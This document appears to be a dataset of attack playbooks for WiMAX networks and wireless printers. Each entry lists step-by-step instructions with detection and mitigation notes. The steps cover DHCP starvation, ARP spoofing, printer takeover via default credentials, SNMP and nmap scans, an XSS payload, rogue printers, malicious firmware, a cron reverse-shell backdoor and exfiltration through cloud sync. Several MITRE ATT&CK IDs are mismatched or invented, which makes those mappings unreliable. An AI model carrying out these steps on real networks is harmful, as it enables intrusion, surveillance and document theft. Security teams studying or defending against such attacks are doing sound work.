## DHCP Starvation on WiMAX Clients

- **Attack Type**: Resource Exhaustion
- **Target**: WiMAX Network
- **Vulnerability**: No IP lease limit per MAC
- **MITRE**: T1499.001
- **Impact**: Client lockout, network service denial
- **Tools**: Scapy, DHCP Starvation Script
- **Scenario**: Attacker floods DHCP server with bogus requests, exhausting available IPs.
- **Attack Steps**: Step 1: Connect attacker system to the WiMAX network legitimately or via spoofing.Step 2: Launch DHCP starvation tool to send hundreds of fake requests with different MACs.Step 3: Each request consumes one IP address from the available pool.Step 4: Monitor the DHCP scope and ensure exhaustion occurs.Step 5: Try connecting a real client to verify if it fails due to no available IPs.
- **Detection**: Monitor IP pool exhaustion and lease logs
- **Solution**: Limit leases per user and monitor activity
- **Tags**: DHCP Abuse, Starvation, WiMAX

## WiMAX Control Channel Injection

- **Attack Type**: Protocol Injection
- **Target**: WiMAX Clients
- **Vulnerability**: Control channel unauthenticated
- **MITRE**: T1557.001
- **Impact**: Misconfiguration, signal disruption
- **Tools**: GNU Radio, Packet Crafting Script
- **Scenario**: Attacker forges MAC management messages to confuse or manipulate the base station.
- **Attack Steps**: Step 1: Capture real control messages using SDR and GNU Radio.Step 2: Identify control messages like DCD/UCD (Downlink/Uplink Channel Descriptors).Step 3: Modify descriptors with malicious parameters (e.g., fake frequencies or burst profiles).Step 4: Inject forged messages into the control channel stream.Step 5: Monitor for misbehavior by clients that respond to the fake messages.
- **Detection**: RF monitoring & control message validation
- **Solution**: Authenticate and sign control traffic
- **Tags**: Injection, Control, WiMAX

## WiMAX Fragmentation Attack

- **Attack Type**: Fragmentation Abuse
- **Target**: WiMAX Client / BS
- **Vulnerability**: Poor fragment validation
- **MITRE**: T1221
- **Impact**: Denial-of-service or filter bypass
- **Tools**: Scapy, GNU Radio, USRP
- **Scenario**: The attacker sends artificially fragmented packets that confuse reassembly logic in WiMAX clients or base stations, potentially causing crashes or bypassing filters.
- **Attack Steps**: Step 1: Study the fragmentation behavior of WiMAX data packets (especially large ones split into smaller fragments).Step 2: Use Scapy to craft packets with inconsistent or excessive fragmentation headers (e.g., overlapping fragments, missing parts).Step 3: Transmit those packets using GNU Radio and USRP.Step 4: Target the fragments to the base station or client and observe whether it reassembles them improperly.Step 5: Log any crash, hang, or unexpected behavior in the device or system.
- **Detection**: Inspect packet logs for malformed fragments
- **Solution**: Implement strict reassembly and RFC compliance
- **Tags**: Fragmentation, Crash, Bypass

## WiMAX TDD Desynchronization Attack

- **Attack Type**: Timing Exploit
- **Target**: WiMAX Network
- **Vulnerability**: No protection against external time sync interference
- **MITRE**: T1600
- **Impact**: Desynchronization and reduced performance
- **Tools**: SDR, GNU Radio, Custom Sync Disruptor
- **Scenario**: An attacker introduces timing inconsistencies in Time Division Duplex (TDD) mode, disrupting WiMAX uplink and downlink communication.
- **Attack Steps**: Step 1: Monitor the TDD uplink/downlink pattern used in the WiMAX system (typically fixed slot timings).Step 2: Use SDR to inject timing-offset synchronization bursts into the channel.Step 3: Intentionally overlap or misalign bursts with scheduled time slots.Step 4: Measure how the base station or clients misinterpret time boundaries, causing lost packets or misrouted uplink.Step 5: Log throughput and error rates during the test.
- **Detection**: Analyze signal timings and overlaps
- **Solution**: Use GPS-sync and internal timing validation
- **Tags**: Timing Attack, TDD, WiMAX

## WiMAX QoS Manipulation for Preferential Treatment

- **Attack Type**: QoS Exploit
- **Target**: WiMAX Base Station
- **Vulnerability**: Weak validation of client-declared QoS levels
- **MITRE**: T1557.003
- **Impact**: Bandwidth theft, unfair usage
- **Tools**: Packet Injector Tool, SDR
- **Scenario**: Attacker manipulates QoS (Quality of Service) settings to obtain better bandwidth or priority over other clients.
- **Attack Steps**: Step 1: Observe real QoS profiles used (Gold, Silver, Bronze tiers) by capturing connection establishment packets.Step 2: Modify your forged packets to include high-priority QoS settings (e.g., Gold tier) even if not authorized.Step 3: Inject them during initial connection to the base station.Step 4: Monitor whether the station grants priority access or better data rates.Step 5: Test bandwidth and confirm successful QoS override.
- **Detection**: Monitor per-client QoS declarations
- **Solution**: Validate QoS profiles against user subscription
- **Tags**: QoS Abuse, Resource Theft, WiMAX

## WiMAX IP Spoofing for Traffic Redirection

- **Attack Type**: IP Spoofing
- **Target**: WiMAX Network
- **Vulnerability**: No source IP verification at lower layers
- **MITRE**: T1557.002
- **Impact**: Session hijacking or data interception
- **Tools**: Scapy, IP Tables, SDR
- **Scenario**: The attacker spoofs a trusted client IP address to receive or inject traffic on its behalf, disrupting communication or exfiltrating data.
- **Attack Steps**: Step 1: Use SDR to monitor current client IP addresses active on the WiMAX network.Step 2: Use scapy to craft data packets or requests with a spoofed source IP.Step 3: Inject those packets into the network pretending to be the victim client.Step 4: Observe responses from base station or other endpoints being redirected to attacker.Step 5: Confirm traffic redirection or duplication as part of a man-in-the-middle.
- **Detection**: Monitor IP/MAC mismatches and anomalies
- **Solution**: Use deep packet inspection and identity binding
- **Tags**: IP Spoofing, MITM, WiMAX

## WiMAX ARP Spoofing in Bridged Deployments

- **Attack Type**: ARP Poisoning
- **Target**: WiMAX-bridged LAN
- **Vulnerability**: ARP has no authentication mechanism
- **MITRE**: T1557.001
- **Impact**: Man-in-the-middle, credential theft
- **Tools**: Bettercap, Wireshark, SDR
- **Scenario**: In networks where WiMAX clients are bridged into LANs, attacker spoofs ARP to redirect traffic through themselves.
- **Attack Steps**: Step 1: Gain access to the same bridged LAN environment (either via rogue client or compromised device).Step 2: Use Bettercap to perform ARP spoofing by sending fake ARP responses to WiMAX clients and routers.Step 3: Redirect the clients’ traffic through your device.Step 4: Monitor intercepted traffic using Wireshark and analyze credentials, websites, etc.Step 5: Optionally modify traffic for phishing or payload injection simulation.
- **Detection**: Monitor ARP tables and packet routes
- **Solution**: Use dynamic ARP inspection and static ARP configs
- **Tags**: ARP Spoof, MITM, WiMAX

## Unauthorized Printing via Open Wi-Fi Printer

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Lack of authentication or access control on print job submission
- **MITRE**: T1190 (Exploit Public-Facing Application)
- **Impact**: Wasted resources, prank, potential for harassment
- **Tools**: Laptop, Wireshark, Printer's IP, RawPrint
- **Scenario**: An attacker finds an unsecured wireless printer on a public network and sends unauthorized print jobs.
- **Attack Steps**: Step 1: Connect your laptop to the same Wi-Fi as the target printer (e.g., public library or café).Step 2: Use a network scanner like Fing or Angry IP Scanner to find connected devices.Step 3: Identify the printer by its name or manufacturer (e.g., HP, Canon).Step 4: Use RawPrint or copy-paste a document and send it using Windows’ LPR command (or via direct IP printing).Step 5: Observe that the printer executes the job without authentication.
- **Detection**: Monitor print logs and track anomalies in job patterns
- **Solution**: Disable open printing, enforce WPA2/WPA3, use PIN printing
- **Tags**: wireless, printer, hijack, prank

## Printer Settings Tampering via Web Interface

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Default credentials or no authentication on web admin interface
- **MITRE**: T1078.001 (Valid Accounts: Default Accounts)
- **Impact**: DNS hijack, device disruption, user confusion
- **Tools**: Web browser, Fing, HTTP analyzer
- **Scenario**: An attacker accesses the printer’s admin panel over Wi-Fi and changes settings, like DNS or display messages.
- **Attack Steps**: Step 1: Connect to the printer’s Wi-Fi or to the same network.Step 2: Use a tool like Fing or nmap to find the printer’s IP.Step 3: Open a browser and navigate to http://[printer-ip].Step 4: If no login is required (or default creds like admin/admin), enter the settings panel.Step 5: Change network settings (e.g., DNS to attacker's server), set display messages, or modify default language.Step 6: Save and exit. Watch printer behavior change.
- **Detection**: Monitor admin access logs and DNS settings changes
- **Solution**: Change default passwords, restrict panel to LAN or use HTTPS auth
- **Tags**: wireless, printer, admin, dns

## Printer Buffer Overflow via Malformed File

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Lack of input validation in printer firmware
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: DoS, printer crash, potential remote code execution
- **Tools**: Custom script, malformed PDF, PDF Toolkit
- **Scenario**: A crafted PDF file causes the printer to crash or behave abnormally when printed wirelessly.
- **Attack Steps**: Step 1: Create a malformed PDF file using tools like PDF Toolkit or a fuzzing script that overflows input buffers.Step 2: Connect to the same Wi-Fi as the target printer.Step 3: Use Windows print-to-IP or CUPS (Linux/macOS) to send the file.Step 4: The printer receives the file and may freeze, reboot, or print random garbage.Step 5: Observe abnormal printer behavior or service interruption.
- **Detection**: System logs, alert if printer reboots or hangs frequently
- **Solution**: Update firmware, enable input validation, vendor patches
- **Tags**: wireless, printer, overflow, fuzz

## Intercepting Print Jobs via Wi-Fi Sniffing

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Unencrypted print transmission
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Privacy breach, sensitive data leak
- **Tools**: Wireshark, tcpdump, Monitor Mode Wi-Fi adapter
- **Scenario**: An attacker captures unencrypted print jobs sent to a wireless printer.
- **Attack Steps**: Step 1: Place your Wi-Fi adapter into monitor mode using airmon-ng start wlan0.Step 2: Use Wireshark or tcpdump to sniff packets on the same wireless network.Step 3: Filter packets for port 9100 (RAW printing) or IPP (Internet Printing Protocol).Step 4: Reconstruct captured print data using a script or manual extraction.Step 5: View printed documents or sensitive content (e.g., resumes, financial docs).
- **Detection**: Monitor for rogue devices in monitor mode, encrypted traffic alerts
- **Solution**: Use encrypted protocols (IPPS), isolate printer network
- **Tags**: sniffing, printer, wi-fi, interception

## Fake Wireless Printer Broadcast (Rogue Printer)

- **Attack Type**: Wireless Printer Hijacking
- **Target**: End-user Device, Wireless Printer
- **Vulnerability**: Lack of SSID validation and trusted device list
- **MITRE**: T1557.002 (Adversary-in-the-Middle: ARP Cache Poisoning)
- **Impact**: Document theft, data manipulation, impersonation
- **Tools**: Raspberry Pi, airbase-ng, printer emulator
- **Scenario**: An attacker sets up a rogue wireless printer with a similar name to trick users into connecting.
- **Attack Steps**: Step 1: Configure your Raspberry Pi with airbase-ng to broadcast a fake SSID like "HP_OfficeJet_Pro_123".Step 2: Run a fake printer service (e.g., using Pretender or a custom HTTP server mimicking a printer UI).Step 3: Wait for users to connect and send print jobs.Step 4: Capture submitted files, or redirect them to a different real printer for stealth.Step 5: Log user information or modify documents in transit.
- **Detection**: Detect rogue SSIDs, use MAC-based printer whitelisting
- **Solution**: Validate printer identity, segment networks
- **Tags**: wireless, rogue, printer, ssid, impersonation

## Exploiting Printer Firmware via Telnet Access

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Exposed Telnet/FTP with default or no authentication
- **MITRE**: T1078.001 (Valid Accounts: Default Accounts)
- **Impact**: Complete configuration takeover
- **Tools**: Nmap, Telnet Client, Netcat
- **Scenario**: Many older wireless printers still expose Telnet or FTP ports with little to no security, allowing attackers to access and alter firmware settings.
- **Attack Steps**: Step 1: Connect to the same wireless network as the printer.Step 2: Use nmap -p 23,21 [printer_ip] to scan for Telnet or FTP ports.Step 3: If Telnet is open, use a Telnet client: telnet [printer_ip].Step 4: If no credentials are required or default creds work, navigate through the printer’s command interface.Step 5: Access configurations like system logs, firmware updates, or network settings.Step 6: Alter DNS, SNMP, or debug settings to redirect or spy on future print jobs.
- **Detection**: Monitor open ports and access attempts, audit logs
- **Solution**: Disable Telnet/FTP, use SSH or HTTPS, change default passwords
- **Tags**: printer, telnet, firmware, hijack

## SNMP Enumeration for Printer Data Leak

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Open SNMP port with default community string
- **MITRE**: T1046 (Network Service Scanning)
- **Impact**: Metadata exposure, profiling risk
- **Tools**: SNMPWalk, snmpenum, Nmap
- **Scenario**: An attacker queries SNMP on wireless printers to pull sensitive data such as printed documents' metadata, ink levels, and user details.
- **Attack Steps**: Step 1: Connect to the same Wi-Fi network as the target printer.Step 2: Use nmap -p 161 -sU [printer_ip] to confirm SNMP is open.Step 3: Run snmpwalk -v1 -c public [printer_ip] to extract SNMP data.Step 4: View values like number of printed pages, usernames, job types, and error logs.Step 5: Log the metadata for profiling users and print usage behavior.
- **Detection**: Monitor SNMP queries, audit access to 161/UDP
- **Solution**: Change SNMP community string, disable SNMP if unused
- **Tags**: printer, SNMP, leak, enumeration

## Remote Code Execution via Printer Update Function

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Insecure firmware upload and verification
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: Persistent printer compromise
- **Tools**: Custom payload, Web browser, Printer SDK
- **Scenario**: Some printers allow firmware updates via web panel or print job. This can be exploited to upload malicious firmware.
- **Attack Steps**: Step 1: Identify the printer make and model.Step 2: Download the official firmware and reverse-engineer its structure using Binwalk.Step 3: Create a malicious firmware with embedded shell or reverse shell.Step 4: Access the printer’s web admin page and locate firmware update option.Step 5: Upload modified firmware and wait for it to reboot.Step 6: Upon successful load, attacker gains backdoor into printer.
- **Detection**: Firmware integrity check logs, alerts during update
- **Solution**: Only allow signed firmware, disable local firmware uploads
- **Tags**: firmware, printer, rce, backdoor

## Password Brute Force on Printer Web Interface

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Weak password policy or exposed interface
- **MITRE**: T1110.001 (Brute Force: Password Guessing)
- **Impact**: Unauthorized configuration access
- **Tools**: Hydra, Burp Suite, browser
- **Scenario**: A weak password on the printer’s admin panel allows brute-force login and full control.
- **Attack Steps**: Step 1: Locate the printer’s IP using nmap or arp -a.Step 2: Navigate to the web panel (usually port 80 or 443).Step 3: Use Burp Suite or Hydra to brute-force login page with common password lists.Step 4: Once successful, login to the panel and modify settings.Step 5: Optionally lock out legitimate users or reroute printer traffic.
- **Detection**: Lockout logs, excessive failed login attempts
- **Solution**: Enforce password policy, rate-limit login attempts
- **Tags**: printer, brute force, web panel

## Cross-Site Scripting on Printer Web Panel

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Lack of input sanitization
- **MITRE**: T1059.007 (Command and Scripting Interpreter: JavaScript)
- **Impact**: Persistent access, UI redirection, session hijack
- **Tools**: Browser, JavaScript payload
- **Scenario**: A vulnerable web interface allows XSS which can be used to steal admin sessions or redirect users.
- **Attack Steps**: Step 1: Login to the printer’s admin page (or access open one).Step 2: In input fields (like display name or network name), insert payload such as <script>alert("XSS")</script>.Step 3: Save changes and reload the page.Step 4: If code executes, attacker can escalate to steal session cookies or inject persistent malicious scripts.Step 5: Use captured session data to gain unauthorized access.
- **Detection**: Web interface logs, script alerts in logs
- **Solution**: Sanitize input fields, apply security headers
- **Tags**: xss, printer, hijack, script

## Captive Print Portal Manipulation

- **Attack Type**: Wireless Printer Hijacking
- **Target**: End-User
- **Vulnerability**: Unsecured HTTP captive print portals
- **MITRE**: T1557.002 (Adversary-in-the-Middle)
- **Impact**: User compromise, malware delivery
- **Tools**: MITMProxy, custom HTML
- **Scenario**: Wireless printers with captive web portals for printing can be abused to inject malicious links or scripts.
- **Attack Steps**: Step 1: Connect to a public print hotspot (e.g., hotel or airport offering wireless print service).Step 2: Set up MITMProxy or a rogue AP to intercept HTTP requests to the printer’s captive portal.Step 3: Inject malicious links (e.g., drive-by downloads) in the HTML response of the print submission page.Step 4: Wait for user to access modified page and interact.Step 5: Log results or drop malware to their device.
- **Detection**: Proxy logs, HTML hash mismatch
- **Solution**: Use HTTPS, secure captive portals
- **Tags**: captive portal, printer, mitm, injection

## QR Code Spoofing on Wireless Printer Display

- **Attack Type**: Wireless Printer Hijacking
- **Target**: End-User
- **Vulnerability**: QR code-based setup manipulation
- **MITRE**: T1205.002 (Traffic Sign Tampering – modified)
- **Impact**: Credential theft, malware install
- **Tools**: QR Code Generator, Sticker, Physical Access
- **Scenario**: Modern printers display QR codes for wireless setup. Attackers replace these with malicious codes linking to phishing sites.
- **Attack Steps**: Step 1: Create a phishing page resembling the printer’s setup portal.Step 2: Generate a QR code pointing to this fake page.Step 3: Print or draw the QR code and stick it physically over the real one on the printer’s display.Step 4: Wait for new users to scan and land on the attacker’s site.Step 5: Harvest network credentials or redirect to malware installer.
- **Detection**: QR code domain validation, user reporting
- **Solution**: Educate users, secure onboarding workflow
- **Tags**: printer, qr code, spoof, phishing

## Job Queue Hijacking

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: No queue prioritization or authentication
- **MITRE**: T1565.002 (Data Manipulation: Stored Data)
- **Impact**: Job loss, user confusion
- **Tools**: CUPS, netcat, custom print scripts
- **Scenario**: An attacker interrupts and replaces active print jobs by injecting jobs rapidly or overwriting print queues.
- **Attack Steps**: Step 1: Connect to the same wireless network as the printer.Step 2: Use CUPS or netcat to flood the printer with multiple fake jobs.Step 3: Legitimate jobs are pushed down or canceled.Step 4: Inject a fake job with alarming or funny content.Step 5: Watch as it prints instead of the original user’s job.
- **Detection**: Monitor job logs and timestamps
- **Solution**: Require authenticated printing, enable job limits
- **Tags**: printer, job hijack, queue, overwrite

## Wi-Fi Direct Printer Hijack Without Router

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Unrestricted Wi-Fi Direct access with default keys
- **MITRE**: T1021.001 (Remote Services: SMB/Print)
- **Impact**: Unauthorized access and misuse
- **Tools**: Mobile device, laptop, printer manual
- **Scenario**: An attacker connects directly to a printer via Wi-Fi Direct, bypassing the need for network credentials.
- **Attack Steps**: Step 1: Enable Wi-Fi on your device and scan for nearby networks.Step 2: Locate the printer’s Wi-Fi Direct SSID (usually format like "DIRECT-HP-1234").Step 3: Connect using default passkey (often printed on the printer label).Step 4: Once connected, send a print job or access internal web interface via printer’s IP (usually 192.168.x.x).Step 5: Perform unauthorized tasks like printing, modifying settings, or scanning.
- **Detection**: Wi-Fi Direct access logs
- **Solution**: Disable Wi-Fi Direct or change passkey
- **Tags**: printer, wi-fi direct, hijack

## Fake Driver Installation to Intercept Print Jobs

- **Attack Type**: Wireless Printer Hijacking
- **Target**: End-User Device
- **Vulnerability**: Social engineering, driver tampering
- **MITRE**: T1205 (Traffic Sign Tampering)
- **Impact**: Data leakage, job redirection
- **Tools**: Malicious driver file, Fake website, DNS spoof
- **Scenario**: Users download a fake driver for a printer that secretly reroutes or copies jobs to attacker’s server.
- **Attack Steps**: Step 1: Set up a phishing site mimicking a printer manufacturer (e.g., hp-printer-driver.com).Step 2: Create a fake driver with hidden print job redirection code.Step 3: Trick victim into downloading via email or ad.Step 4: Once installed, print jobs are silently forwarded to attacker’s system.Step 5: Log or modify print contents before passing to real printer.
- **Detection**: Monitor traffic from driver to third-party IPs
- **Solution**: Use official drivers only, enable endpoint AV alerts
- **Tags**: printer, fake driver, malware

## USB Over Wi-Fi Attack via Printer Sharing

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer, USB Storage
- **Vulnerability**: Insecure USB passthrough over network
- **MITRE**: T1091 (Replication Through Removable Media)
- **Impact**: USB data theft, malware injection
- **Tools**: USB/IP tools, Linux laptop
- **Scenario**: An attacker connects to a shared wireless printer and uses the printer’s USB passthrough to interact with connected USB devices or simulate one.
- **Attack Steps**: Step 1: Locate a wireless printer with an exposed USB port or shared USB device.Step 2: Use tools like usbip or remoteprint to discover and mount shared USB devices via the network.Step 3: If a flash drive is plugged into the printer (e.g., for scanning or printing), mount and browse it remotely.Step 4: Copy sensitive files or inject malicious executables into the drive.Step 5: Wait for the legitimate user to access the USB drive, triggering auto-run malware (e.g., on Windows).
- **Detection**: Monitor shared USB devices and print server logs
- **Solution**: Disable USB sharing over network or restrict access
- **Tags**: printer, usbip, wireless, storage

## Wi-Fi Printer DoS via Print Job Bombing

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: No input rate limiting, large job handling flaws
- **MITRE**: T1499.001 (Endpoint Denial of Service)
- **Impact**: Printer denial of service, user frustration
- **Tools**: Python script, CUPS, RAW printing
- **Scenario**: An attacker floods a wireless printer with extremely large or malformed print jobs, causing it to freeze or reboot repeatedly.
- **Attack Steps**: Step 1: Connect to the same Wi-Fi as the target printer.Step 2: Identify the IP and port (e.g., 9100 or 631 for IPP).Step 3: Use a Python script or terminal commands to continuously send massive print jobs (e.g., 10,000 pages of garbage characters).Step 4: Monitor the printer until it hangs, reboots, or drops network connectivity.Step 5: Repeat to sustain a DoS condition until manually reset.
- **Detection**: System resource logs, alert on queue size
- **Solution**: Limit job size, set printing quotas, rate-limit connections
- **Tags**: printer, dos, large job, flood

## Wi-Fi Printer Used as Persistent Network Foothold

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Writable storage, cron jobs, lack of audit
- **MITRE**: T1053.003 (Scheduled Task/Job: Cron)
- **Impact**: Persistent hidden access point
- **Tools**: Netcat, SSH, Hidden cron job
- **Scenario**: An attacker hides a backdoor on a printer's storage or OS, using it as a pivot point for network re-entry later.
- **Attack Steps**: Step 1: Gain access to printer via web admin, Telnet, or firmware exploit.Step 2: Upload a small reverse shell script to writable storage (e.g., /tmp, USB, or web server dir).Step 3: Create a cron job or config file to run the shell script on reboot.Step 4: Leave the printer running normally.Step 5: Later, reconnect to the same network, and receive a shell from the printer, re-gaining access stealthily.
- **Detection**: Monitor outbound connections, integrity check cron jobs
- **Solution**: Log auditing, firmware verification, disable shell access
- **Tags**: printer, persistence, cron, backdoor

## Fake Print Service Advertising via mDNS Spoofing

- **Attack Type**: Wireless Printer Hijacking
- **Target**: End-User Devices
- **Vulnerability**: Trust in mDNS-discovered services
- **MITRE**: T1557.001 (Adversary-in-the-Middle: mDNS Spoofing)
- **Impact**: Document interception, impersonation
- **Tools**: Avahi, Responder, Linux device
- **Scenario**: The attacker impersonates a wireless printer using mDNS (Multicast DNS) to trick users into sending print jobs.
- **Attack Steps**: Step 1: Install Avahi or Responder on your Linux laptop.Step 2: Configure it to broadcast a fake printer service using the name of a common printer brand (e.g., “Epson-OfficeJet.local”).Step 3: Ensure the fake printer advertises printing over IPP or port 9100.Step 4: Wait for users on the same network to discover and send print jobs to it.Step 5: Capture incoming jobs, documents, or redirect them for later analysis.
- **Detection**: Monitor mDNS traffic, inspect broadcasted services
- **Solution**: Disable mDNS or use printer whitelisting
- **Tags**: mdns, printer spoof, fake print

## Exploiting Printer Cloud Sync for Data Exfiltration

- **Attack Type**: Wireless Printer Hijacking
- **Target**: Wireless Printer
- **Vulnerability**: Unprotected cloud integration
- **MITRE**: T1041 (Exfiltration Over C2 Channel)
- **Impact**: Silent document theft, regulatory violation
- **Tools**: Printer admin panel, Cloud account
- **Scenario**: An attacker configures the printer’s cloud print sync feature to upload jobs to an attacker-controlled email or cloud storage.
- **Attack Steps**: Step 1: Access the printer’s admin panel through local Wi-Fi.Step 2: Navigate to cloud sync or email settings (usually in scan-to-email or cloud-print config).Step 3: Enter attacker’s email or cloud storage credentials.Step 4: Enable automatic sync of print/scanned jobs to this destination.Step 5: Any future scanned document or print job gets uploaded silently to the attacker’s inbox.
- **Detection**: Email/network traffic logs, outbound sync alerts
- **Solution**: Lock admin panel, disable unused cloud sync, use SIEM alerts
- **Tags**: printer, cloud, data theft, sync

